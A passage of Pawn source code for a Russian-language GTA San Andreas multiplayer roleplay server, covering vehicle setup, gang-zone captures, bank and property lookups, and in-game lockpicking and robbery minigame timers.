			    ab = CreateDynamicObject(19797,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.560, -3.882, -1.090, 0.000, 0.000, 0.000);
			    ab = CreateDynamicObject(3031,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    SetDynamicObjectMaterial(ab, 0, 1560, "7_11_door", "cj_sheetmetal2", -15724528);
			    SetDynamicObjectMaterial(ab, 1, 1560, "7_11_door", "CJ_CHROME2", -13619152);
			    SetDynamicObjectMaterial(ab, 2, 1560, "7_11_door", "CJ_CHROME2", -13619152);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.370, -1.392, 2.850, 0.000, 0.000, 270.000);
			    ab = CreateDynamicObject(19797,0.0,0.0,-1000.0,0.0,0.0,0.0,0,0,-1,300.0,300.0);
			    AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], 0.530, -3.882, -1.090, 0.000, 0.000, 0.000);
		    }
		}
	/*	if(VehInfo[idx][vFr] == F_LIC && VehInfo[idx][vModel] == 540)
		{
	   		ab = CreateDynamicObject(19309,0.0, 0.0, 0, 0.0, 0.0, 0.0, -1,  -1, -1,100.0);
			SetDynamicObjectMaterialText(ab, 0, "Учебная",50, "Tahoma", 27, 1, -1, -65536, 1);
			AttachDynamicObjectToVehicle(ab,VehInfo[idx][vVehicle],0,-0.15,0.79,0,0,0);
		}*/
		if(VehInfo[idx][vFr] == F_FBI && VehInfo[idx][vModel] == 560)
		{
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1010);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1139);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1033);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1170);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1140);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1031);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1030);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1029);
		}
        if((VehInfo[idx][vFr] == F_HOSPITAL_LS && (VehInfo[idx][vModel] == 421 || VehInfo[idx][vModel] == 445 || VehInfo[idx][vModel] == 505)))
        {

            ab = CreateDynamicObject(11702,0.0,0.0,0.0,0.0,0.0,0.0);
            if(VehInfo[idx][vModel] == 490 || VehInfo[idx][vModel] == 505) AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.0, -0.2, 1.15, 0.0, 0.0, 0.0);
            else if(VehInfo[idx][vModel] == 570) AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.0, -0.2, 0.85, 0.0, 0.0, 0.0);
            else if(VehInfo[idx][vModel] == 421) AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.0, -0.2, 0.75, 0.0, 0.0, 0.0);
            else if(VehInfo[idx][vModel] == 507) AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.0, -0.2, 0.84, 0.0, 0.0, 0.0);
            else AttachDynamicObjectToVehicle(ab, VehInfo[idx][vVehicle], -0.0, -0.2, 0.87, 0.0, 0.0, 0.0);
        }
		Fuel[VehInfo[idx][vVehicle]] = VehInfo[idx][vFuel];
		LinkVehicleToInterior(VehInfo[idx][vVehicle], VehInfo[idx][vInt]);
		SetVehicleVirtualWorld(VehInfo[idx][vVehicle], VehInfo[idx][vWorld]);
		Fuel[VehInfo[idx][vVehicle]] = VehInfo[idx][vFuel];
		Engine[VehInfo[idx][vVehicle]] = false;
		Lights[VehInfo[idx][vVehicle]] = false;
		veh__pos[VehInfo[idx][vVehicle]][0] = VehInfo[idx][vX];
		veh__pos[VehInfo[idx][vVehicle]][1] = VehInfo[idx][vY];
		veh__pos[VehInfo[idx][vVehicle]][2] = VehInfo[idx][vZ];
		veh__pos[VehInfo[idx][vVehicle]][3] = VehInfo[idx][vFa];
		Locked[VehInfo[idx][vVehicle]] = -1;
	}
	cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadVeh' - загружено %d за %d м.с", TOTALVEH,GetTickCount() - time);
}
stock LoadGZ()
{
	new time = GetTickCount();
 	new Cache:result = mysql_query(mysql, "SELECT * FROM `"TABLE_GANGZONE"`");
	TOTALGZ = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALGZ;idx ++)
	{
	    GZInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
		GZInfo[idx][gCoords][0] = cache_get_row_float(idx-1, 1, mysql);
		GZInfo[idx][gCoords][1]= cache_get_row_float(idx-1, 2, mysql);
		GZInfo[idx][gCoords][2] = cache_get_row_float(idx-1, 3, mysql);
		GZInfo[idx][gCoords][3] = cache_get_row_float(idx-1, 4, mysql);
		GZInfo[idx][gFrak] = cache_get_row_int(idx-1, 5, mysql);
		GZInfo[idx][id] = GangZoneCreate(GZInfo[idx][gCoords][0],GZInfo[idx][gCoords][1],GZInfo[idx][gCoords][2],GZInfo[idx][gCoords][3]);
		GZInfo[idx][gSp] = CreateDynamicCube(GZInfo[idx][gCoords][0],GZInfo[idx][gCoords][1],0, GZInfo[idx][gCoords][2],GZInfo[idx][gCoords][3], 2000);
		ZoneBat[idx] = 0;
	}
	cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadGZ' - загружено %d гангзон за %d м.с", TOTALGZ,GetTickCount() - time);
	return true;
}
stock GetGangZoneColor(gangzonex)
{
	new zx;
	switch(gangzonex)
	{
		case F_GROVE: zx = 0x10DC29AA;
		case F_BALLAS: zx = 0x8813E7AA;
		case F_AZTECAS: zx = 0x01FCFFAA;
		case F_RIFA: zx = 0x83BFBFAA;
		case F_VAGOS: zx = 0xDBD604AA;
		case F_LCN: zx =  0x454545AA;
		case F_RM: zx = 0xAFAFAFAA;
		case F_YAKUZA: zx =  0xDE2626AA;
		default: zx = 0xFFBE0065;
	}
	return zx;
}

stock CaptGo(playerid)
{
    new Float:x,Float:y;
    new idter = CaptInfo[PlayerInfo[playerid][pMember]-6][terid];
	x = (GZInfo[idter][gCoords][0] + GZInfo[idter][gCoords][2]) / 2.0;
	y = (GZInfo[idter][gCoords][1] + GZInfo[idter][gCoords][3]) / 2.0;
    SetPlayerMapIcon(playerid, 12, x, y, 0, 23, 0, MAPICON_GLOBAL);
 	for(new i = 0;i <= 2;i++) PlayerTextDrawShow(playerid,CaptPl[playerid][i]);
 	new playerfrac = PlayerInfo[playerid][pMember]-6;
	new kem = CaptInfo[playerfrac][capture];
	new kemfrac = kem-6;
	if(CaptInfo[playerfrac][gangnumber] == 1)
	{
	   
		static const fmt_string1[] = "_______~r~~h~%s~w~~h~: ~r~%d ~w~~h~kills_________";
		new str1[sizeof(fmt_string1)+30+4];
		format(str1,sizeof(str1),fmt_string1,GangName(PlayerInfo[playerid][pMember]),CaptInfo[playerfrac][score]);
		PlayerTextDrawSetString(playerid,CaptPl[playerid][0],str1);
		static const fmt_string2[] = "_______~r~~h~%s~w~~h~: ~r~%d ~w~~h~kills_________";
		new str2[sizeof(fmt_string2)+30+4];
		format(str2,sizeof(str2),fmt_string2,GangName(kem),CaptInfo[kemfrac][score]);
		PlayerTextDrawSetString(playerid,CaptPl[playerid][2],str2);
	}
	else
	{
		static const fmt_string1[] = "_______~r~~h~%s~w~~h~: ~r~%d ~w~~h~kills_________";
		new str1[sizeof(fmt_string1)+30+4];
		format(str1,sizeof(str1),fmt_string1,GangName(PlayerInfo[playerid][pMember]),CaptInfo[playerfrac][score]);
		PlayerTextDrawSetString(playerid,CaptPl[playerid][2],str1);
		static const fmt_string2[] = "_______~r~~h~%s~w~~h~: ~r~%d ~w~~h~kills_________";
		new str2[sizeof(fmt_string2)+30+4];
		format(str2,sizeof(str2),fmt_string2,GangName(kem),CaptInfo[kemfrac][score]);
		PlayerTextDrawSetString(playerid,CaptPl[playerid][0],str2);
	}
	new stringText[10];
	Convert(GZSafeTime[CaptInfo[playerfrac][terid]], stringText);
	static const fmt_string3[] = "__TIMER: ~b~~h~~h~~h~%s__";
	new str3[sizeof(fmt_string3)+10];
	format(str3,sizeof(str3),fmt_string3,stringText);
	PlayerTextDrawSetString(playerid,CaptPl[playerid][1],str3);
}
stock GangName(number)
{
	new krek[30];
	switch(number)
	{
		case F_GROVE: format(krek,sizeof(krek),"~g~GROVE ST.");
		case F_BALLAS: format(krek,sizeof(krek),"~p~THE BALLAS");
		case F_AZTECAS: format(krek,sizeof(krek),"~b~~h~AZTECAS");
		case F_VAGOS: format(krek,sizeof(krek),"~y~VAGOS");
		case F_RIFA: format(krek,sizeof(krek),"~b~THE RIFA");
		case F_BIKERS: format(krek,sizeof(krek),"~b~BIKERS");
		case F_YAKUZA: format(krek,sizeof(krek),"~r~YAKUZA");
		case F_RM: format(krek,sizeof(krek),"~y~~h~RUSSIAN MAFIA");
		case F_LCN: format(krek,sizeof(krek),"~r~~h~LA COSA NOSTRA");
	}
	return krek;
}
stock PlayerToKvadrat(playerid,Float:min_x,Float:min_y,Float:max_x,Float:max_y)
{
	new Float:xxp,Float:yyp,Float:zzp;
	GetPlayerPos(playerid, xxp, yyp, zzp);
	if((xxp <= max_x && xxp >= min_x) && (yyp <= max_y && yyp >= min_y)) return true;
	return false;
}
stock Convert(seconds, stringTo[], size = sizeof(stringTo))
{
	stringTo[0] = 0x0;
	new result[4];
	result[0] = floatround(seconds / (3600 * 24));
	result[1] = floatround(seconds / 3600);
	result[2] = floatround((seconds / 60) - (result[1] * 60));
	result[3] = floatround(seconds - ((result[1] * 3600) + (result[2] * 60)));
	switch(result[0])
	{
		case 0:
		{
			switch(result[1])
			{
				case 0: format(stringTo,size,"%02d:%02d",result[2],result[3]);
				default: format(stringTo,size,"%d:%02d:%02d",result[1],result[2],result[3]);
			}
		}
	}
	return stringTo;
}
stock CaptureEnd(familyone, familytwo)
{
	new topkill,topkiller = -1;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(PlayerInfo[i][pMember] != familyone && PlayerInfo[i][pMember] != familytwo) continue;
		if(GetPVarInt(i,"KillCapt") > topkill)
		{
			topkill = GetPVarInt(i,"KillCapt");
			topkiller = i;
		}
		DeletePVar(i,"KillCapt");
		for(new k = 0;k <= 2;k++) PlayerTextDrawHide(i,CaptPl[i][k]);

		new a;
		while(a++ < 5) SendDeathMessageToPlayer(i, 1000, 1000, 200);
		RemovePlayerMapIcon(i, 12);
	}
	if(topkiller != -1)
	{
		static const fmt_string3[] = "Лучший игрок на сражении за территорию: %s (%d убийств)";
		new str3[sizeof(fmt_string3)+30];
		format(str3,sizeof(str3),fmt_string3,PlayerInfo[topkiller][pMember],topkill);
		SendFMes(familyone,COLOR_SKLAD,str3);
		SendFMes(familytwo,COLOR_SKLAD,str3);
	}
}

stock LoadBank()
{
    new time = GetTickCount();
    new Cache:result = mysql_query(mysql, "SELECT * FROM `"TABLE_BANK"`");
	TOTALBANK = cache_get_row_count(mysql);
	for (new idx = 1;idx <= TOTALBANK;idx ++)
	{
	    BankInfo[idx][id] = cache_get_row_int(idx-1, 0, mysql);
		BankInfo[idx][bX] = cache_get_row_float(idx-1, 1, mysql);
		BankInfo[idx][bY] = cache_get_row_float(idx-1, 2, mysql);
		BankInfo[idx][bZ] = cache_get_row_float(idx-1, 3, mysql);
		BankInfo[idx][bXX] = cache_get_row_float(idx-1, 4, mysql);
		BankInfo[idx][bYY] = cache_get_row_float(idx-1, 5, mysql);
		BankInfo[idx][bZZ] = cache_get_row_float(idx-1, 6, mysql);
		BankInfo[idx][bObj] = CreateDynamicObject(2754,BankInfo[idx][bX],BankInfo[idx][bY],BankInfo[idx][bZ],BankInfo[idx][bXX],BankInfo[idx][bYY],BankInfo[idx][bZZ]);
  		BankInfo[idx][bLab] = Create3DTextLabelEx("{FFFFFF}Используйте: {f7ae11}LALT",-1, BankInfo[idx][bX],BankInfo[idx][bY],BankInfo[idx][bZ],2.0,0,0);
	}
	cache_delete(result, mysql);
	printf(" [LOAD]: Успешная загрузка 'LoadBank' - загружено %d за %d м.с", TOTALBANK,GetTickCount() - time);
}

stock GetPlayerBiz(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALBIZ;i++)
	{
		if(strcmp(PlayerInfo[playerid][pSendername], BizInfo[i][bOwner], true) == 0) house++, SetPVarInt(playerid, "PlayerBiz", i);
	}
	return house;
}
stock GetPlayerUpr(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALBIZ;i++)
	{
		if(strcmp(PlayerInfo[playerid][pSendername], BizInfo[i][bMen], true) == 0) house++, SetPVarInt(playerid, "PlayerBiz", i);
	}
	return house;
}
stock GetFamHouse(famid)
{
	new house = 0;
	if(!FamInfo[famid][fHouse]) return house;
	for(new i = 1; i <= TOTALHOUSE;i++)
	{
		if(strcmp(FamInfo[famid][fLeader], HInfo[i][hOwner], true) == 0) house++;
	}
	return house;
}
stock GetPlayerHouse(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALHOUSE;i++)
	{
		if(strcmp(PlayerInfo[playerid][pSendername], HInfo[i][hOwner], true) == 0) house++, SetPVarInt(playerid, "PlayerHouse", i);
	}
	return house;
}
stock GetPlayerKom(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALKOM;i++)
	{
		if(strcmp(PlayerInfo[playerid][pSendername], KomInfo[i][kOwner], true) == 0) house++, SetPVarInt(playerid, "PlayerKom", i);
	}
	return house;
}
stock GetPlayerZasel(playerid)
{
	new house = 0;
	for(new i = 1; i <= TOTALHOUSE;i++)
	{
		if(strcmp(PlayerInfo[playerid][pSendername], HInfo[i][hZasel1], true) == 0) house++, SetPVarInt(playerid, "PlayerHouse", i),SetPVarInt(playerid, "PlayerZasel", 1);
		else if(strcmp(PlayerInfo[playerid][pSendername], HInfo[i][hZasel2], true) == 0) house++, SetPVarInt(playerid, "PlayerHouse", i),SetPVarInt(playerid, "PlayerZasel", 2);
		else if(strcmp(PlayerInfo[playerid][pSendername], HInfo[i][hZasel3], true) == 0) house++, SetPVarInt(playerid, "PlayerHouse", i),SetPVarInt(playerid, "PlayerZasel", 3);
		else if(strcmp(PlayerInfo[playerid][pSendername], HInfo[i][hZasel4], true) == 0) house++, SetPVarInt(playerid, "PlayerHouse", i),SetPVarInt(playerid, "PlayerZasel", 4);
	}
	return house;
}
stock IsTextRussian(text[])
{
	if(strfind(text, "а", true) != -1) return true;
	if(strfind(text, "б", true) != -1) return true;
	if(strfind(text, "в", true) != -1) return true;
	if(strfind(text, "г", true) != -1) return true;
	if(strfind(text, "д", true) != -1) return true;
	if(strfind(text, "е", true) != -1) return true;
	if(strfind(text, "ё", true) != -1) return true;
	if(strfind(text, "ж", true) != -1) return true;
	if(strfind(text, "з", true) != -1) return true;
	if(strfind(text, "и", true) != -1) return true;
	if(strfind(text, "й", true) != -1) return true;
	if(strfind(text, "к", true) != -1) return true;
	if(strfind(text, "л", true) != -1) return true;
	if(strfind(text, "м", true) != -1) return true;
	if(strfind(text, "н", true) != -1) return true;
	if(strfind(text, "о", true) != -1) return true;
	if(strfind(text, "п", true) != -1) return true;
	if(strfind(text, "р", true) != -1) return true;
	if(strfind(text, "с", true) != -1) return true;
	if(strfind(text, "т", true) != -1) return true;
	if(strfind(text, "у", true) != -1) return true;
	if(strfind(text, "ф", true) != -1) return true;
	if(strfind(text, "х", true) != -1) return true;
	if(strfind(text, "ц", true) != -1) return true;
	if(strfind(text, "ч", true) != -1) return true;
	if(strfind(text, "ш", true) != -1) return true;
	if(strfind(text, "щ", true) != -1) return true;
	if(strfind(text, "ъ", true) != -1) return true;
	if(strfind(text, "ы", true) != -1) return true;
	if(strfind(text, "ь", true) != -1) return true;
	if(strfind(text, "э", true) != -1) return true;
	if(strfind(text, "ю", true) != -1) return true;
	if(strfind(text, "я", true) != -1) return true;
	return false;
}

stock InfoOplHouse(playerid)
{
	static const fmt_string1[] = "За дом уже оплачено на %s вперед";
	new str1[sizeof(fmt_string1)+10];
	format(str1, sizeof(str1), fmt_string1,timec(HInfo[GetPVarInt(playerid,"PlayerHouse")][hOplata]));
	return SendClientMessage(playerid,-1,str1);
}
stock InfoOplCar(playerid)
{
	static const fmt_string1[] = "За транспорт уже оплачено на %s вперед";
	new str1[sizeof(fmt_string1)+10];
	format(str1, sizeof(str1), fmt_string1,timec(VInfo[GetPVarInt(playerid,"Car")][voplata]));
	return SendClientMessage(playerid,-1,str1);
}
stock InfoOplBiz(playerid)
{
	static const fmt_string1[] = "За бизнес уже оплачено на %s вперед";
	new str1[sizeof(fmt_string1)+10];
	format(str1, sizeof(str1), fmt_string1,timec(BizInfo[GetPVarInt(playerid,"PlayerBiz")][bZeml]));
	return SendClientMessage(playerid,-1,str1);
}

stock CarTrunk(vehicleid, status)
{
	if(vehicleid==INVALID_VEHICLE_ID) return false;
	BInfo[vehicleid][bLock] = (status == 1) ? (0) : (1);
	new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
	GetVehicleParamsEx(vehicleid, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
	SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, edoors, ebonnet, status, eobjective);
	if(!status) Trunk[vehicleid] = false;
	else Trunk[vehicleid] = true;
	return true;
}
stock CarDoors(vehicleid, status)
{
	if(vehicleid==INVALID_VEHICLE_ID) return false;
	new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
	GetVehicleParamsEx(vehicleid, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
	SetVehicleParamsEx(vehicleid, eengine, elights, ealarm, status, ebonnet, eboot, eobjective);
	return true;
}
stock UpdateKazna()
{
	static const fmt_string1[] = "{FFFFFF}В казне: {f7ae11}%i$";
	new str1[sizeof(fmt_string1)+5];
	format(str1, sizeof(str1), fmt_string1,Kazna);
	Update3DTextLabelTextEx(KaznaText, 0xFFFFFFFF, str1);
}

stock UpdateMat(num)
{
	new kek = 0,text[20],str[50];
	switch(num)
	{
		case F_GROVE,F_BALLAS,F_RIFA,F_AZTECAS,F_VAGOS:
		{
		    format(str,sizeof(str),"\nГраффити: {f7ae11}%d/38", TotalGraf[num-6]);
			for(new i = 1; i <= TOTALGZ; i++)
			{
				if(GZInfo[i][gFrak] != num) continue;
			 	kek++;
			}
			text = "Территорий";
		}
		case F_BIKERS,F_LCN,F_YAKUZA,F_RM:
		{
            for(new i = 1; i <= TOTALBIZ; i++)
			{
				if(BizInfo[i][bMafia] != num) continue;
				kek++;
			}
			text = "Бизнесов";
		}
	}
	
	
	static const fmt_string1[] = "{f7ae11}%s\n{FFFFFF}%s: {f7ae11}%i\n{FFFFFF}Деньги: {f7ae11}$%i\n{FFFFFF}Материалы: {f7ae11}%i\n{FFFFFF}Наркотики: {f7ae11}%i{FFFFFF}%s";
	new str1[sizeof(fmt_string1)+32+5+5+10+25];
	format(str1, sizeof(str1), fmt_string1,FracInfo[num][fName],text,kek, FracBank[num],FracMats[num],FracDrugs[num],str);
	Update3DTextLabelTextEx(TextOrg[num-6], CREWARD, str1);
}
stock UpdNark()
{
	static const fmt_string1[] = "{FFFFFF}Наркотики: {f7ae11}%i ";
	new str1[sizeof(fmt_string1)+5];
	format(str1, sizeof(str1), fmt_string1,NarkSklad);
	Update3DTextLabelTextEx(NarkText1, CREWARD, str1);
}
stock SaveGZ(idx)
{
    query = "";
	format(query, 512, "UPDATE "TABLE_GANGZONE" SET gFrakVlad = %i WHERE gID = %i",
	GZInfo[idx][gFrak], idx);
	mysql_tquery(mysql,query);
	return true;
}

stock GetCena(biz,cena)
{
   new krek = cena*BizInfo[biz][bTill]/100;
   return krek;
}
stock SendCopsMessage(str[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		if(IsACop(i)) SendClientMessage(i,COLOR_SKLAD,str);
	}
}


forward ClearBotGlobalClear(bot,Text3D:text);
public ClearBotGlobalClear(bot,Text3D:text)
{
    Update3DTextLabelTextEx(text,0xC2C2C220,"-");
    ClearActorAnimations(bot);
}
forward ClearBotGlobal(bot,Text3D:text);
public ClearBotGlobal(bot,Text3D:text)
{
    Update3DTextLabelTextEx(text,-1,"Взаимодействие: {f7ae11}H");
    ClearActorAnimations(bot);
}



forward UpdateBar();
public UpdateBar()
{
    static const fmt_str5[] = "{f7ae11}%i${FFFFFF}\nИспользуйте: {f7ae11}H";
	new string5[sizeof(fmt_str5)+32];
    static const fmt_string1[] = "Вы украли %i материалов";
	new str1[sizeof(fmt_string1)+4];
	static const fmt_str4[] = "{f7ae11}%i/30000{FFFFFF} материалов\nИспользуйте: {f7ae11}H";
	new string4[sizeof(fmt_str4)+32];
	static const fmt_string3[] = "Вы украли %i$";
	new str3[sizeof(fmt_string3)+4];
//	new strr[50];
	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
	    if(!IsPlayerConnected(playerid) || PlayerLogged[playerid] == false) continue;
	    if(GetPVarInt(playerid,"HackCar") > 0)
	    {
	        if(progress[playerid] <= 0)
			{
			    for(new i1 = 0; i1<= 10; i1++) TextDrawHideForPlayer(playerid,ProgressBar[i1]);
				for(new i1 = 0; i1<= 1; i1++) PlayerTextDrawDestroy(playerid,ProgressBarP[i1][playerid]);
				
			    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
			    DeletePVar(playerid,"HackCar");
			    DeletePVar(playerid,"HackCarID");
			    SendClientMessage(playerid,CREWARD,"Вам не удалось взломать транспорт");
			    CancelSelectTextDraw(playerid);
			}
			if(progress[playerid] >= 100)
			{
			    if(GetPVarInt(playerid,"CarRob") && GetPVarInt(playerid,"CarRobW") == 1)
			    {
			        if(GetPVarInt(playerid,"HackCarID") == CarRob[GetPVarInt(playerid,"CarRob")-1])
			        {
			            SendClientMessage(playerid,CGREEN,"Отвезите транспорт в гараж!");
			            SendClientMessage(playerid,CREWARD,"Чем сильнее повреждён транспорт, тем меньше Вам заплатят!");
			            SetPlayerRaceCheckpoint(playerid,2,2410.3970,-1425.6722,23.6744,0,0,0,5);
			            SetPVarInt(playerid,"CarRobW",2);
			            GangZoneHideForPlayer(playerid,CarRobGz[GetPVarInt(playerid,"CarRob")-1]);
			            PutPlayerInVehicle(playerid,GetPVarInt(playerid,"HackCarID"),0);
			        }
			    }
			    IsLocked[GetPVarInt(playerid,"HackCarID")] = false;
			    
           		CarDoors(GetPVarInt(playerid,"HackCarID"),0);
    			for(new i1 = 0; i1<= 10; i1++) TextDrawShowForPlayer(playerid,ProgressBar[i1]);
				for(new i1 = 0; i1<= 1; i1++) PlayerTextDrawDestroy(playerid,ProgressBarP[i1][playerid]);
    			SetTimerEx("ClearAnim", 300, 0, "d", playerid);
			    DeletePVar(playerid,"HackCar");
			    DeletePVar(playerid,"HackCarID");
			    CancelSelectTextDraw(playerid);
			}
			progress[playerid] = progress[playerid]-1;
			PlayerTextDrawHide(playerid,ProgressBarP[1][playerid]);
			PlayerTextDrawTextSize(playerid, ProgressBarP[1][playerid], 0.93*progress[playerid], 9.955566);
			PlayerTextDrawShow(playerid,ProgressBarP[1][playerid]);
			//format(strr,sizeof(strr),"PROGRESS: ~r~%d%",progress[playerid]);
			//PlayerTextDrawSetString(playerid, CarHackTD[playerid][7],strr);
				
	    }
		if(GetPVarInt(playerid,"Vzlom") > 0)
		{
			if(progress[playerid] <= 0)
			{
				for(new i = 0; i<= 4; i++) PlayerTextDrawDestroy(playerid,Progress[playerid][i]);
				switch(GetPVarInt(playerid,"Vzlom"))
				{
					case 2:
					{
						TogglePlayerControllable(GetPVarInt(playerid,"ChID"),1);
						SetTimerEx("ClearAnim", 300, 0, "d", playerid);
						GetVehicleParamsEx(GetPlayerVehicleID(GetPVarInt(playerid,"ChID")),engine,lights,alarm,doors,bonnet,boot,objective);
						SetVehicleParamsEx(GetPlayerVehicleID(GetPVarInt(playerid,"ChID")),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						SendClientMessage(playerid,CREWARD,"Вам не удалось отремонтировать транспорт");
						SendClientMessage(GetPVarInt(playerid,"ChID"),CREWARD,"Механику не удалось отремонтировать Ваш транспорт");
						DeletePVar(GetPVarInt(playerid,"ChID"),"RepCena");
					}
					case 6:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CGREEN,"Вам не удалось разделать ингредиент. Возьмите новый");
						DestroyDynamicObject(GetPVarInt(playerid,"PovarObject"));
						DeletePVar(playerid,"PovarObject");
						SetPlayerCheckpoint(playerid,1390.6154,-1.6414,1000.9299, 1.0);
						SetPVarInt(playerid,"PovarW",1);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					}
					case 7:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CGREEN,"Вам не удалось собрать, возьмите новые заготовки.");
					    SetPVarInt(playerid,"MedicW",1);
						if(IsValidDynamicObject(GetPVarInt(playerid,"MedicObj1") && GetPVarInt(playerid,"MedicObj1") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"MedicObj1")),DeletePVar(playerid,"MedicObj1");
						if(IsValidDynamicObject(GetPVarInt(playerid,"MedicObj2") && GetPVarInt(playerid,"MedicObj2") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"MedicObj2")),DeletePVar(playerid,"MedicObj2");
						if(IsValidDynamicObject(GetPVarInt(playerid,"MedicObj3") && GetPVarInt(playerid,"MedicObj3") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"MedicObj3")),DeletePVar(playerid,"MedicObj3");
					}
					case 10:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
						if(IsValidDynamicObject(GetPVarInt(playerid,"ArmyObj1") && GetPVarInt(playerid,"ArmyObj1") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"ArmyObj1")),DeletePVar(playerid,"ArmyObj1");
						DeletePVar(playerid,"ArmyW");
					}
					case 11:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CGREEN,"Вам не удалось сшить, возьмите новые заготовки.");
					    SetPVarInt(playerid,"ShveW",1);
			            SetPlayerCheckpoint(playerid, 237.2976,-12.2067,1013.2339, 3.0);
					}
					case 15:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CGREEN,"Вам не удалось украсть устройство подбора паролей.");
						ClearBandQ(playerid);
					}
					case 14:
					{
                        SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CGREEN,"Вам не удалось взломать дверь.");
					}
					case 17:
					{
					    SendClientMessage(playerid,CREWARD,"Вам не удалось взломать сигнализацию! Она сработала - бегите!");
					    SendBandMes(PlayerInfo[playerid][pGrabTeam],CREWARD,"Ограбление провалено! Причина: Вас заметили");
					    for(new g = 0; g < MAX_PLAYERS; g++)
						{
							if(!IsPlayerConnected(g) || PlayerLogged[g] == false || PlayerInfo[g][pGrabTeam] != PlayerInfo[playerid][pGrabTeam]) continue;
							SetPlayerWantedLevel(g,6);
							PlayerInfo[g][pWanted] = 6;
							SendClientMessage(g,CBLUE,"Внимание! Вы были объявлены в розыск 6 степени | Объявление дал: Камера наблюдения | Причина: Ограбление");
							strmid(PlayerInfo[g][pSuAd], "Ограбление", 0, strlen("Ограбление"), 20);
						}
					    ClearBank(PlayerInfo[playerid][pGrabTeam],BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown]);
					    ClearBand(PlayerInfo[playerid][pGrabTeam]);
					   	SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					}
					case 18:
					{
					    SendClientMessage(playerid,CREWARD,"Вам неудалось взломать ячейку!");
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					}


				}
				DeletePVar(playerid,"Vzlom");
				DeletePVar(playerid,"ChID");
				return;
			}
			
			if(progress[playerid] >= 100)
			{
				for(new i = 0; i<= 4; i++) PlayerTextDrawDestroy(playerid,Progress[playerid][i]);
				
				switch(GetPVarInt(playerid,"Vzlom"))
				{
					case 1:
					{
					//	new pip = 500 - PlayerInfo[playerid][pMats];
						if(!GetFree(playerid,447,500))
						{
							BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] -= 500;
							PlayerInfo[playerid][pMats] += 500;
                            GiveInv(playerid,447,500);
							format(str1, sizeof(str1), fmt_string1,500);
							SendClientMessage(playerid,CREWARD,str1);
							
							format(string4, sizeof(string4), fmt_str4, BizInfo[GetPVarInt(playerid,"PBIZ")][bProd]);
							Update3DTextLabelTextEx(BotLable1[GetPVarInt(playerid,"PBIZ")],-1,string4);
						}
						else SendClientMessage(playerid,CGREY,"Недостаточно места в инвентаре!");
					}
					case 2:
					{
						SetTimerEx("ClearAnim", 300, 0, "d", playerid);
						TogglePlayerControllable(GetPVarInt(playerid,"ChID"),1);
						GetVehicleParamsEx(GetPlayerVehicleID(GetPVarInt(playerid,"ChID")),engine,lights,alarm,doors,bonnet,boot,objective);
						SetVehicleParamsEx(GetPlayerVehicleID(GetPVarInt(playerid,"ChID")),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
						SetVehicleHealth(GetPlayerVehicleID(GetPVarInt(playerid,"ChID")), 1000);
						RepairVehicle(GetPlayerVehicleID(GetPVarInt(playerid,"ChID")));
						GiveMoney(playerid,GetPVarInt(GetPVarInt(playerid,"ChID"),"RepCena"));
